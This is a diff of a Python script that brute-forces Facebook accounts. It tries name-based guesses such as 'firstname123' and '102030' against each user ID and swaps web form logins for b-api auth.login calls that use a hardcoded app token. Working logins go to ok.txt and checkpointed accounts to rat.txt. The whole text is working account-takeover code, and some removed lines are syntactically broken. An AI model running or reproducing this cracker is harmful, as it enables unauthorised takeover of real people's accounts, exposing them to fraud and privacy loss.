@@ -764,197 +764,263 @@ def crack_select1():
 		user=arg
 		uid,name=user.split("|")
 		vaugent = random.choice(agents)
-		ses = requests.Session()
+		session = requests.Session()
 		session.headers.update({'User-Agent': vaugent})
 		try:
 			pass1 = name.lower().split(' ')[0] + '1234'
-			ses.headers.update({"Host":'mbasic.facebook.com',"upgrade-insecure-requests":"1","user-agent": vaugent,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
-			p = ses.get('https://mbasic.facebook.com/login/device-based/password/?uid='+uid+'&flow=login_no_pin&refsrc=deprecated&locale=en_US&_rdr').text
-			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":uid,"flow":"login_no_pin","pass":pass1,"next":"https://mbasic.facebook.com/login/save-device/'"}
-			ses.headers.update({"Host":'mbasic.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://mbasic.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent": vaugent,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":'https://mbasic.facebook.com/login/device-based/password/?uid='+uid+'&flow=login_no_pin&refsrc=deprecated&locale=en_UD&_rdr',"accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
-			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0&locale2=en_US',data=dataa,allow_redirects=False)
-			if "checkpoint" in po.cookies.get_dict().keys():
-				print(" \033[1;33m[CHECKPOINT] "+uid+" | "+pass1+"\033[0;97m")
-				cp = open("rat.txt", "a")
-				cp.write(uid+"|"+pass1+"\n")
-				cp.close()
-				cps.append(uid+pass1)
-			elif "c_user" in ses.cookies.get_dict().keys():
-				coki=po.cookies.get_dict()
-				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
+			data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass1+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_).text
+			q = json.loads(data)
+			if "access_token" in q and "EAAA" in q:
 				print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass1+"\033[0;97m")
 				ok = open("ok.txt", "a")
 				ok.write(uid+"|"+pass1+"\n")
 				ok.close()
 				oks.append(uid+pass1)
+			else:
+				if "www.facebook.com" in q['error_msg']:
+					print(" \033[1;33m[CHECKPOINT] "+uid+" | "+pass1+"\033[0;97m")
+					cp = open("rat.txt", "a")
+					cp.write(uid+"|"+pass1+"\n")
+					cp.close()
+					cps.append(uid+pass1)
 				else:
 					pass2 = name.lower().split(' ')[0] + '123'
-					ses.headers.update({"Host":'mbasic.facebook.com',"upgrade-insecure-requests":"1","user-agent": vaugent,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
-					p = ses.get('https://mbasic.facebook.com/login/device-based/password/?uid='+uid+'&flow=login_no_pin&refsrc=deprecated&locale=en_US&_rdr').text
-					dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":uid,"flow":"login_no_pin","pass":,"next":"https://mbasic.facebook.com/login/save-device/'"}
-					ses.headers.update({"Host":'mbasic.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://mbasic.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent": vaugent,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":'https://mbasic.facebook.com/login/device-based/password/?uid='+uid+'&flow=login_no_pin&refsrc=deprecated&locale=en_UD&_rdr',"accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
-					po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0&locale2=en_US',data=dataa,allow_redirects=False)
-					if "checkpoint" in po.cookies.get_dict().keys():
-						print(" \033[1;33m[CHECKPOINT] "+uid+" | "+pass2+"\033[0;97m")
-						cp = open("rat.txt", "a")
-						cp.write(uid+"|"+pass2+"\n")
-						cp.close()
-						cps.append(uid+pass2)
-					elif "c_user" in ses.cookies.get_dict().keys():
-						coki=po.cookies.get_dict()
-						coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
+					data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass2+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_).text
+					q = json.loads(data)
+					if "access_token" in q and "EAAA" in q:
 						print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass2+"\033[0;97m")
 						ok = open("ok.txt", "a")
 						ok.write(uid+"|"+pass2+"\n")
 						ok.close()
 						oks.append(uid+pass2)
+					else:
+						if "www.facebook.com" in q['error_msg']:
+							print(" \033[1;33m[CHECKPOINT] "+uid+" | "+pass2+"\033[0;97m")
+							cp = open("rat.txt", "a")
+							cp.write(uid+"|"+pass2+"\n")
+							cp.close()
+							cps.append(uid+pass2)
 						else:
 							pass3 = name.lower().split(' ')[0] + '12'
-							ses.headers.update({"Host":'mbasic.facebook.com',"upgrade-insecure-requests":"1","user-agent": vaugent,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
-							p = ses.get('https://mbasic.facebook.com/login/device-based/password/?uid='+uid+'&flow=login_no_pin&refsrc=deprecated&locale=en_US&_rdr').text
-							dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":uid,"flow":"login_no_pin","pass":,"next":"https://mbasic.facebook.com/login/save-device/'"}
-							ses.headers.update({"Host":'mbasic.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://mbasic.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent": vaugent,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":'https://mbasic.facebook.com/login/device-based/password/?uid='+uid+'&flow=login_no_pin&refsrc=deprecated&locale=en_UD&_rdr',"accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
-							po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0&locale2=en_US',data=dataa,allow_redirects=False)
-							if "checkpoint" in po.cookies.get_dict().keys():
-								print(" \033[1;33m[CHECKPOINT] "+uid+" | "+pass3+"\033[0;97m")
-								cp = open("rat.txt", "a")
-								cp.write(uid+"|"+pass3+"\n")
-								cp.close()
-								cps.append(uid+pass3)
-							elif "c_user" in ses.cookies.get_dict().keys():
-								coki=po.cookies.get_dict()
-								coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
+							data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass3+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_).text
+							q = json.loads(data)
+							if "access_token" in q and "EAAA" in q:
 								print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass3+"\033[0;97m")
 								ok = open("ok.txt", "a")
 								ok.write(uid+"|"+pass3+"\n")
 								ok.close()
 								oks.append(uid+pass3)
+							else:
+								if "www.facebook.com" in q['error_msg']:
+									print(" \033[1;33m[CHECKPOINT] "+uid+" | "+pass3+"\033[0;97m")
+									cp = open("rat.txt", "a")
+									cp.write(uid+"|"+pass3+"\n")
+									cp.close()
+									cps.append(uid+pass3)
 								else:
 									pass4 = name.lower().split(' ')[1] + '1234'
-									ses.headers.update({"Host":'mbasic.facebook.com',"upgrade-insecure-requests":"1","user-agent": vaugent,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
-									p = ses.get('https://mbasic.facebook.com/login/device-based/password/?uid='+uid+'&flow=login_no_pin&refsrc=deprecated&locale=en_US&_rdr').text
-									dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":uid,"flow":"login_no_pin","pass":,"next":"https://mbasic.facebook.com/login/save-device/'"}
-									ses.headers.update({"Host":'mbasic.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://mbasic.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent": vaugent,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":'https://mbasic.facebook.com/login/device-based/password/?uid='+uid+'&flow=login_no_pin&refsrc=deprecated&locale=en_UD&_rdr',"accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
-									po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0&locale2=en_US',data=dataa,allow_redirects=False)
-									if "checkpoint" in po.cookies.get_dict().keys():
-										print(" \033[1;33m[CHECKPOINT] "+uid+" | "+pass4+"\033[0;97m")
-										cp = open("rat.txt", "a")
-										cp.write(uid+"|"+pass4+"\n")
-										cp.close()
-										cps.append(uid+pass4)
-									elif "c_user" in ses.cookies.get_dict().keys():
-										coki=po.cookies.get_dict()
-										coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
+									data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass4+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_).text
+									q = json.loads(data)
+									if "access_token" in q and "EAAA" in q:
 										print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass4+"\033[0;97m")
 										ok = open("ok.txt", "a")
 										ok.write(uid+"|"+pass4+"\n")
 										ok.close()
 										oks.append(uid+pass4)
+									else:
+										if "www.facebook.com" in q['error_msg']:
+											print(" \033[1;33m[CHECKPOINT] "+uid+" | "+pass4+"\033[0;97m")
+											cp = open("rat.txt", "a")
+											cp.write(uid+"|"+pass4+"\n")
+											cp.close()
+											cps.append(uid+pass4)
 										else:
 											pass5 = name.lower().split(' ')[1] + '123'
-											ses.headers.update({"Host":'mbasic.facebook.com',"upgrade-insecure-requests":"1","user-agent": vaugent,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
-											p = ses.get('https://mbasic.facebook.com/login/device-based/password/?uid='+uid+'&flow=login_no_pin&refsrc=deprecated&locale=en_US&_rdr').text
-											dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":uid,"flow":"login_no_pin","pass":,"next":"https://mbasic.facebook.com/login/save-device/'"}
-											ses.headers.update({"Host":'mbasic.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://mbasic.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent": vaugent,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":'https://mbasic.facebook.com/login/device-based/password/?uid='+uid+'&flow=login_no_pin&refsrc=deprecated&locale=en_UD&_rdr',"accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
-											po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0&locale2=en_US',data=dataa,allow_redirects=False)
-											if "checkpoint" in po.cookies.get_dict().keys():
-												print(" \033[1;33m[CHECKPOINT] "+uid+" | "+pass5+"\033[0;97m")
-												cp = open("rat.txt", "a")
-												cp.write(uid+"|"+pass5+"\n")
-												cp.close()
-												cps.append(uid+pass5)
-											elif "c_user" in ses.cookies.get_dict().keys():
-												coki=po.cookies.get_dict()
-												coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
+											data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass5+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_).text
+											q = json.loads(data)
+											if "access_token" in q and "EAAA" in q:
 												print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass5+"\033[0;97m")
 												ok = open("ok.txt", "a")
 												ok.write(uid+"|"+pass5+"\n")
 												ok.close()
 												oks.append(uid+pass5)
+											else:
+												if "www.facebook.com" in q['error_msg']:
+													print(" \033[1;33m[CHECKPOINT] "+uid+" | "+pass5+"\033[0;97m")
+													cp = open("rat.txt", "a")
+													cp.write(uid+"|"+pass5+"\n")
+													cp.close()
+													cps.append(uid+pass5)
 												else:
 													pass6 = name.lower().split(' ')[1] + '12'
-													ses.headers.update({"Host":'mbasic.facebook.com',"upgrade-insecure-requests":"1","user-agent": vaugent,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
-													p = ses.get('https://mbasic.facebook.com/login/device-based/password/?uid='+uid+'&flow=login_no_pin&refsrc=deprecated&locale=en_US&_rdr').text
-													dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":uid,"flow":"login_no_pin","pass":,"next":"https://mbasic.facebook.com/login/save-device/'"}
-													ses.headers.update({"Host":'mbasic.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://mbasic.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent": vaugent,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":'https://mbasic.facebook.com/login/device-based/password/?uid='+uid+'&flow=login_no_pin&refsrc=deprecated&locale=en_UD&_rdr',"accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
-													po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0&locale2=en_US',data=dataa,allow_redirects=False)
-													if "checkpoint" in po.cookies.get_dict().keys():
-														print(" \033[1;33m[CHECKPOINT] "+uid+" | "+pass6+"\033[0;97m")
-														cp = open("rat.txt", "a")
-														cp.write(uid+"|"+pass6+"\n")
-														cp.close()
-														cps.append(uid+pass6)
-													elif "c_user" in ses.cookies.get_dict().keys():
-														coki=po.cookies.get_dict()
-														coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
+													data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass6+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_).text
+													q = json.loads(data)
+													if "access_token" in q and "EAAA" in q:
 														print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass6+"\033[0;97m")
 														ok = open("ok.txt", "a")
 														ok.write(uid+"|"+pass6+"\n")
 														ok.close()
 														oks.append(uid+pass6)
+													else:
+														if "www.facebook.com" in q['error_msg']:
+															print(" \033[1;33m[CHECKPOINT] "+uid+" | "+pass6+"\033[0;97m")
+															cp = open("rat.txt", "a")
+															cp.write(uid+"|"+pass6+"\n")
+															cp.close()
+															cps.append(uid+pass6)
 														else:
 															pass7 = name.lower()
-															ses.headers.update({"Host":'mbasic.facebook.com',"upgrade-insecure-requests":"1","user-agent": vaugent,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
-															p = ses.get('https://mbasic.facebook.com/login/device-based/password/?uid='+uid+'&flow=login_no_pin&refsrc=deprecated&locale=en_US&_rdr').text
-															dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":uid,"flow":"login_no_pin","pass":,"next":"https://mbasic.facebook.com/login/save-device/'"}
-															ses.headers.update({"Host":'mbasic.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://mbasic.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent": vaugent,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":'https://mbasic.facebook.com/login/device-based/password/?uid='+uid+'&flow=login_no_pin&refsrc=deprecated&locale=en_UD&_rdr',"accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
-															po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0&locale2=en_US',data=dataa,allow_redirects=False)
-															if "checkpoint" in po.cookies.get_dict().keys():
-																print(" \033[1;33m[CHECKPOINT] "+uid+" | "+pass7+"\033[0;97m")
-																cp = open("rat.txt", "a")
-																cp.write(uid+"|"+pass7+"\n")
-																cp.close()
-																cps.append(uid+pass7)
-															elif "c_user" in ses.cookies.get_dict().keys():
-																coki=po.cookies.get_dict()
-																coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
+															data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass7+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_).text
+															q = json.loads(data)
+															if "access_token" in q and "EAAA" in q:
 																print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass7+"\033[0;97m")
 																ok = open("ok.txt", "a")
 																ok.write(uid+"|"+pass7+"\n")
 																ok.close()
 																oks.append(uid+pass7)
+															else:
+																if "www.facebook.com" in q['error_msg']:
+																	print(" \033[1;33m[CHECKPOINT] "+uid+" | "+pass7+"\033[0;97m")
+																	cp = open("rat.txt", "a")
+																	cp.write(uid+"|"+pass7+"\n")
+																	cp.close()
+																	cps.append(uid+pass7)
 																else:
 																	pass8 = name.lower().split(' ')[0] + name.lower().split(' ')[1]
-																	ses.headers.update({"Host":'mbasic.facebook.com',"upgrade-insecure-requests":"1","user-agent": vaugent,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
-																	p = ses.get('https://mbasic.facebook.com/login/device-based/password/?uid='+uid+'&flow=login_no_pin&refsrc=deprecated&locale=en_US&_rdr').text
-																	dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":uid,"flow":"login_no_pin","pass":,"next":"https://mbasic.facebook.com/login/save-device/'"}
-																	ses.headers.update({"Host":'mbasic.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://mbasic.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent": vaugent,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":'https://mbasic.facebook.com/login/device-based/password/?uid='+uid+'&flow=login_no_pin&refsrc=deprecated&locale=en_UD&_rdr',"accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
-																	po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0&locale2=en_US',data=dataa,allow_redirects=False)
-																	if "checkpoint" in po.cookies.get_dict().keys():
-																		print(" \033[1;33m[CHECKPOINT] "+uid+" | "+pass8+"\033[0;97m")
-																		cp = open("rat.txt", "a")
-																		cp.write(uid+"|"+pass8+"\n")
-																		cp.close()
-																		cps.append(uid+pass8)
-																	elif "c_user" in ses.cookies.get_dict().keys():
-																		coki=po.cookies.get_dict()
-																		coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
+																	data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass8+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_).text
+																	q = json.loads(data)
+																	if "access_token" in q and "EAAA" in q:
 																		print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass8+"\033[0;97m")
 																		ok = open("ok.txt", "a")
 																		ok.write(uid+"|"+pass8+"\n")
 																		ok.close()
 																		oks.append(uid+pass8)
+																	else:
+																		if "www.facebook.com" in q['error_msg']:
+																			print(" \033[1;33m[CHECKPOINT] "+uid+" | "+pass8+"\033[0;97m")
+																			cp = open("rat.txt", "a")
+																			cp.write(uid+"|"+pass8+"\n")
+																			cp.close()
+																			cps.append(uid+pass8)
 																		else:
 																  			pass9 = "102030"
-																  			ses.headers.update({"Host":'mbasic.facebook.com',"upgrade-insecure-requests":"1","user-agent": vaugent,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
-																			p = ses.get('https://mbasic.facebook.com/login/device-based/password/?uid='+uid+'&flow=login_no_pin&refsrc=deprecated&locale=en_US&_rdr').text
-																			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":uid,"flow":"login_no_pin","pass":,"next":"https://mbasic.facebook.com/login/save-device/'"}
